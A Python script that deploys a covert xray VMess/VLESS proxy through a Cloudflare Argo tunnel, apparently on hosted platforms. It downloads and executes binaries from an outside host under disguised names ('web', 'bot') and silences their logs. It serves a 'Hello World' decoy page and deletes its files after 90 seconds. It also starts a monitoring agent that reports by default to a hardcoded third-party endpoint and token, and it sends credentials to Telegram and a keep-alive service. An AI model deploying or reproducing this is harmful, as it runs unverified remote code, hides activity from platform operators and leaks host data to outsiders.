import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer

# Environment variables
UPLOAD_URL = os.environ.get('UPLOAD_URL', '')          # 节点或订阅上传地址
PROJECT_URL = os.environ.get('PROJECT_URL', '')        # 项目url
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', 'false').lower() == 'true'  # 自动保活
FILE_PATH = os.environ.get('FILE_PATH', './.cache')    # 运行路径
SUB_PATH = os.environ.get('SUB_PATH', 'sub')           # 订阅token
UUID = os.environ.get('UUID', '20e6e496-cf19-45c8-b883-14f5e11cd9f1')  # UUID
ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', '')        # Argo固定隧道域名
ARGO_AUTH = os.environ.get('ARGO_AUTH', '')            # Argo固定隧道密钥
ARGO_PORT = int(os.environ.get('ARGO_PORT', '8001'))   # Argo端口
CFIP = os.environ.get('CFIP', 'www.visa.com.tw')       # 优选ip或优选域名
CFPORT = int(os.environ.get('CFPORT', '443'))          # 优选端口
NAME = os.environ.get('NAME', 'Vls')                   # 节点名称
CHAT_ID = os.environ.get('CHAT_ID', '')                # Telegram chat_id
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')            # Telegram bot_token
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000) # 订阅端口

# komari-agent环境变量
ENDPOINT = os.environ.get('ENDPOINT', 'https://gcp.240713.xyz')  # komari-agent端点
TOKEN = os.environ.get('TOKEN', 'rP6F8lvOgWZXViUxnmDq1I')        # komari-agent token

# Create running folder
def create_directory():
    print('\033c', end='')
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
        print(f"{FILE_PATH} is created")
    else:
        print(f"{FILE_PATH} already exists")

# Global variables
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
komari_agent_path = os.path.join(FILE_PATH, 'komari-agent')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

# Delete nodes
def delete_nodes():
    try:
        if not UPLOAD_URL:
            return

        if not os.path.exists(sub_path):
            return

        try:
            with open(sub_path, 'r') as file:
                file_content = file.read()
        except:
            return None

        decoded = base64.b64decode(file_content).decode('utf-8')
        nodes = [line for line in decoded.split('\n') if 'vmess://' in line]

        if not nodes:
            return

        try:
            requests.post(f"{UPLOAD_URL}/api/delete-nodes", 
                          data=json.dumps({"nodes": nodes}),
                          headers={"Content-Type": "application/json"})
        except:
            return None
    except Exception as e:
        print(f"Error in delete_nodes: {e}")
        return None

# Clean up old files
def cleanup_old_files():
    paths_to_delete = ['web', 'bot', 'boot.log', 'list.txt']
    for file in paths_to_delete:
        file_path = os.path.join(FILE_PATH, file)
        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path)
                else:
                    os.remove(file_path)
        except Exception as e:
            print(f"Error removing {file_path}: {e}")

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Hello World')
            
        elif self.path == f'/{SUB_PATH}':
            try:
                with open(sub_path, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass
    
# Determine system architecture
def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

# Download file based on architecture
def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"Download {file_name} successfully")
        return True
    except Exception as e:
        if os.path.exists(file_path):
            os.remove(file_path)
        print(f"Download {file_name} failed: {e}")
        return False

# Get files for architecture
def get_files_for_architecture(architecture):
    if architecture == 'arm':
        base_files = [
            {"fileName": "web", "fileUrl": "https://arm64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://arm64.ssss.nyc.mn/2go"}
        ]
    else:
        base_files = [
            {"fileName": "web", "fileUrl": "https://amd64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://amd64.ssss.nyc.mn/2go"}
        ]
    return base_files

# Download komari-agent
def download_komari_agent():
    if os.path.exists(komari_agent_path):
        print('komari-agent already exists')
        return True

    architecture = get_system_architecture()
    if architecture == 'arm':
        agent_url = 'https://github.com/ly921002/gcp/raw/refs/heads/main/komari-agent'
    else:
        agent_url = 'https://github.com/ly921002/gcp/raw/refs/heads/main/komari-agent'

    try:
        print('Downloading komari-agent...')
        response = requests.get(agent_url, stream=True)
        response.raise_for_status()
        
        with open(komari_agent_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # 设置执行权限
        os.chmod(komari_agent_path, 0o755)
        print('komari-agent downloaded successfully')
        return True
    except Exception as e:
        print(f'Error downloading komari-agent: {e}')
        # 尝试备用下载源
        return download_komari_agent_alternative()

def download_komari_agent_alternative():
    architecture = get_system_architecture()
    if architecture == 'arm':
        agent_url = 'https://raw.githubusercontent.com/ly921002/gcp/refs/heads/main/komari-agent-linux-amd64'
    else:
        agent_url = 'https://raw.githubusercontent.com/ly921002/gcp/refs/heads/main/komari-agent-linux-amd64'

    try:
        print('Trying alternative download source...')
        response = requests.get(agent_url, stream=True)
        response.raise_for_status()
        
        with open(komari_agent_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        os.chmod(komari_agent_path, 0o755)
        print('komari-agent downloaded successfully from alternative source')
        return True
    except Exception as e:
        print(f'Error downloading komari-agent from alternative source: {e}')
        return False

# Start komari-agent
def start_komari_agent():
    if not ENDPOINT or not ENDPOINT.startswith('http'):
        print('Invalid ENDPOINT format. It should be a valid URL starting with http:// or https://')
        print('Current ENDPOINT:', ENDPOINT)
        return

    if not os.path.exists(komari_agent_path):
        print('komari-agent not found at:', komari_agent_path)
        return

    try:
        # 使用参数启动komari-agent
        args = ['-e', ENDPOINT, '-t', TOKEN]
        command = f"nohup {komari_agent_path} {' '.join(args)} > {os.path.join(FILE_PATH, 'komari-agent.log')} 2>&1 &"
        
        subprocess.run(command, shell=True, check=True)
        print('komari-agent started successfully in background')
        print(f'ENDPOINT: {ENDPOINT}')
        print(f'TOKEN: {TOKEN}')
        print(f'Logs are being written to: {os.path.join(FILE_PATH, "komari-agent.log")}')
    except Exception as e:
        print(f'Error starting komari-agent: {e}')

# Authorize files with execute permission
def authorize_files(file_paths):
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        if os.path.exists(absolute_file_path):
            try:
                os.chmod(absolute_file_path, 0o775)
                print(f"Empowerment success for {absolute_file_path}: 775")
            except Exception as e:
                print(f"Empowerment failed for {absolute_file_path}: {e}")

# Configure Argo tunnel
def argo_type():
    if not ARGO_AUTH or not ARGO_DOMAIN:
        print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
        return

    if "TunnelSecret" in ARGO_AUTH:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
            f.write(ARGO_AUTH)
        
        tunnel_id = ARGO_AUTH.split('"')[11]
        tunnel_yml = f"""
tunnel: {tunnel_id}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
            f.write(tunnel_yml)
    else:
        print("Use token connect to tunnel,please set the {ARGO_PORT} in cloudflare")

# Execute shell command and return output
def exec_cmd(command):
    try:
        process = subprocess.Popen(
            command, 
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        return stdout + stderr
    except Exception as e:
        print(f"Error executing command: {e}")
        return str(e)

# Download and run necessary files
async def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)
    
    if not files_to_download:
        print("Can't find a file for the current architecture")
        return
    
    # Download all files
    download_success = True
    for file_info in files_to_download:
        if not download_file(file_info["fileName"], file_info["fileUrl"]):
            download_success = False
    
    if not download_success:
        print("Error downloading files")
        return
    
    # Authorize files
    files_to_authorize = ['web', 'bot']
    authorize_files(files_to_authorize)
    
    # Generate configuration file (只保留vmess)
    config = {
        "log": {
            "access": "/dev/null",
            "error": "/dev/null",
            "loglevel": "none"
        },
        "inbounds": [
            {
                "port": ARGO_PORT,
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
                    "decryption": "none",
                    "fallbacks": [{"path": "/vmess-argo", "dest": 3003}]
                },
                "streamSettings": {"network": "tcp"}
            },
            {
                "port": 3003,
                "listen": "127.0.0.1",
                "protocol": "vmess",
                "settings": {"clients": [{"id": UUID, "alterId": 0}]},
                "streamSettings": {
                    "network": "ws",
                    "wsSettings": {"path": "/vmess-argo"}
                },
                "sniffing": {
                    "enabled": True,
                    "destOverride": ["http", "tls", "quic"],
                    "metadataOnly": False
                }
            }
        ],
        "outbounds": [
            {"protocol": "freedom", "tag": "direct"},
            {"protocol": "blackhole", "tag": "block"}
        ]
    }
    
    with open(os.path.join(FILE_PATH, 'config.json'), 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)
    
    # Run xray
    command = f"nohup {os.path.join(FILE_PATH, 'web')} -c {os.path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &"
    try:
        exec_cmd(command)
        print('web is running')
        time.sleep(1)
    except Exception as e:
        print(f"web running error: {e}")
    
    # Run cloudflared
    if os.path.exists(os.path.join(FILE_PATH, 'bot')):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif "TunnelSecret" in ARGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {os.path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:{ARGO_PORT}"
        
        try:
            exec_cmd(f"nohup {os.path.join(FILE_PATH, 'bot')} {args} >/dev/null 2>&1 &")
            print('bot is running')
            time.sleep(2)
        except Exception as e:
            print(f"Error executing command: {e}")
    
    time.sleep(5)
    
    # Extract domains and generate sub.txt
    await extract_domains()

# Extract domains from cloudflared logs
async def extract_domains():
    argo_domain = None

    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print(f'ARGO_DOMAIN: {argo_domain}')
        await generate_links(argo_domain)
    else:
        try:
            # 等待cloudflared生成日志
            time.sleep(5)
            
            if not os.path.exists(boot_log_path):
                print('boot.log file not found, waiting longer...')
                time.sleep(5)
            
            if os.path.exists(boot_log_path):
                with open(boot_log_path, 'r') as f:
                    file_content = f.read()
                
                lines = file_content.split('\n')
                argo_domains = []
                
                for line in lines:
                    domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
                    if domain_match:
                        domain = domain_match.group(1)
                        argo_domains.append(domain)
                
                if argo_domains:
                    argo_domain = argo_domains[0]
                    print(f'ArgoDomain: {argo_domain}')
                    await generate_links(argo_domain)
                else:
                    print('ArgoDomain not found in boot.log, attempting to restart cloudflared...')
                    # 重启cloudflared
                    try:
                        subprocess.run('pkill -f "[b]ot" > /dev/null 2>&1', shell=True)
                        time.sleep(3)
                        
                        args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'
                        subprocess.run(f'nohup {os.path.join(FILE_PATH, "bot")} {args} >/dev/null 2>&1 &', shell=True)
                        print('bot restarted')
                        time.sleep(8)
                        
                        # 再次尝试提取域名
                        if os.path.exists(boot_log_path):
                            with open(boot_log_path, 'r') as f:
                                file_content = f.read()
                            
                            lines = file_content.split('\n')
                            argo_domains = []
                            
                            for line in lines:
                                domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
                                if domain_match:
                                    domain = domain_match.group(1)
                                    argo_domains.append(domain)
                            
                            if argo_domains:
                                argo_domain = argo_domains[0]
                                print(f'ArgoDomain found after restart: {argo_domain}')
                                await generate_links(argo_domain)
                                return
                        
                        print('Still no ArgoDomain found, using fallback method')
                        await generate_links('fallback.trycloudflare.com')
                        
                    except Exception as e:
                        print(f'Error restarting cloudflared: {e}')
                        await generate_links('error.trycloudflare.com')
            else:
                print('boot.log not found after waiting, using fallback method')
                await generate_links('fallback.trycloudflare.com')
                
        except Exception as e:
            print(f'Error reading boot.log: {e}')
            await generate_links('error.trycloudflare.com')

# Upload nodes to subscription service
def upload_nodes():
    if UPLOAD_URL and PROJECT_URL:
        subscription_url = f"{PROJECT_URL}/{SUB_PATH}"
        json_data = {
            "subscription": [subscription_url]
        }
        
        try:
            response = requests.post(
                f"{UPLOAD_URL}/api/add-subscriptions",
                json=json_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print('Subscription uploaded successfully')
        except Exception as e:
            pass
    
    elif UPLOAD_URL:
        if not os.path.exists(sub_path):
            return
        
        with open(sub_path, 'r') as f:
            content = f.read()
        
        nodes = [line for line in content.split('\n') if 'vmess://' in line]
        
        if not nodes:
            return
        
        json_data = json.dumps({"nodes": nodes})
        
        try:
            response = requests.post(
                f"{UPLOAD_URL}/api/add-nodes",
                data=json_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print('Nodes uploaded successfully')
        except:
            return None
    else:
        return

# Push subscription content to Telegram
async def push_subscription_content():
    if not BOT_TOKEN or not CHAT_ID:
        print('Telegram推送未配置: BOT_TOKEN 或 CHAT_ID 为空')
        return False

    try:
        # 读取sub.txt内容
        if not os.path.exists(sub_path):
            print('sub.txt 文件不存在')
            return False

        with open(sub_path, 'r') as f:
            sub_content = f.read()
        
        # 如果内容太长，分割发送
        if len(sub_content) > 4000:
            # 分割内容发送
            chunks = [sub_content[i:i+4000] for i in range(0, len(sub_content), 4000)]
            for i, chunk in enumerate(chunks):
                await send_telegram_message(f"<b>订阅内容 ({i + 1}/{len(chunks)})</b>\n\n<pre>{chunk}</pre>")
                # 避免发送过快
                await asyncio.sleep(1)
        else:
            # 直接发送完整内容
            await send_telegram_message(f"<b>订阅内容</b>\n\n<pre>{sub_content}</pre>")
        
        print('订阅内容推送成功')
        return True
    except Exception as e:
        print(f'推送订阅内容失败: {e}')
        return False

# Send Telegram message
async def send_telegram_message(message):
    if not BOT_TOKEN or not CHAT_ID:
        return False

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        response = requests.post(url, data=data)
        return response.json().get('ok', False)
    except Exception as e:
        print(f'Telegram推送错误: {e}')
        return False

# Generate links and subscription content
async def generate_links(argo_domain):
    try:
        # 获取ISP信息
        meta_info = subprocess.run(['curl', '-s', 'https://speed.cloudflare.com/meta'], 
                                 capture_output=True, text=True)
        meta_info = meta_info.stdout.split('"')
        ISP = f"{meta_info[25]}-{meta_info[17]}".replace(' ', '_').strip()
    except:
        ISP = "Unknown"

    node_name = f"{NAME}-{ISP}" if NAME else ISP

    time.sleep(2)
    
    # 只生成vmess配置
    VMESS = {
        "v": "2", 
        "ps": node_name, 
        "add": CFIP, 
        "port": CFPORT, 
        "id": UUID, 
        "aid": "0", 
        "scy": "none", 
        "net": "ws", 
        "type": "none", 
        "host": argo_domain, 
        "path": "/vmess-argo?ed=2560", 
        "tls": "tls", 
        "sni": argo_domain, 
        "alpn": "", 
        "fp": "firefox"
    }
    
    sub_txt = f"vmess://{base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}"
    
    # 保存订阅文件
    encoded_content = base64.b64encode(sub_txt.encode('utf-8')).decode('utf-8')
    with open(sub_path, 'w', encoding='utf-8') as sub_file:
        sub_file.write(encoded_content)
    
    print('Generated subscription content:')
    print(encoded_content)
    print(f"{FILE_PATH}/sub.txt saved successfully")
    
    # 推送订阅内容到Telegram
    await push_subscription_content()
    
    # 上传节点
    upload_nodes()
    
    return sub_txt

# Add automatic access task
def add_visit_task():
    if not AUTO_ACCESS or not PROJECT_URL:
        print("Skipping adding automatic access task")
        return
    
    try:
        response = requests.post(
            'https://keep.gvrander.eu.org/add-url',
            json={"url": PROJECT_URL},
            headers={"Content-Type": "application/json"}
        )
        print('automatic access task added successfully')
    except Exception as e:
        print(f'Failed to add URL: {e}')

# Clean up files after 90 seconds
def clean_files():
    def _cleanup():
        time.sleep(90)  # Wait 90 seconds
        files_to_delete = [boot_log_path, config_path, web_path, bot_path]
        
        # 保留komari-agent
        if os.path.exists(komari_agent_path):
            files_to_delete = [f for f in files_to_delete if f != komari_agent_path]
        
        for file in files_to_delete:
            try:
                if os.path.exists(file):
                    if os.path.isdir(file):
                        shutil.rmtree(file)
                    else:
                        os.remove(file)
            except:
                pass
        
        print('\033c', end='')
        print('App is running')
        print('Thank you for using this script, enjoy!')
    
    threading.Thread(target=_cleanup, daemon=True).start()

# Main function to start the server
async def start_server():
    delete_nodes()
    cleanup_old_files()
    create_directory()
    argo_type()
    
    # 下载komari-agent
    agent_downloaded = download_komari_agent()
    
    await download_files_and_run()
    
    # 启动komari-agent
    if agent_downloaded:
        print('Starting komari-agent...')
        start_komari_agent()
    else:
        print('komari-agent download failed, skipping startup')
    
    add_visit_task()
    
    server_thread = Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()   
    
    clean_files()

def run_server():
    server = HTTPServer(('0.0.0.0', PORT), RequestHandler)
    print(f"Server is running on port {PORT}")
    print(f"Running done！")
    print(f"\nLogs will be delete in 90 seconds")
    server.serve_forever()

def run_async():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_server()) 
    
    while True:
        time.sleep(3600)
        
if __name__ == "__main__":
    run_async()
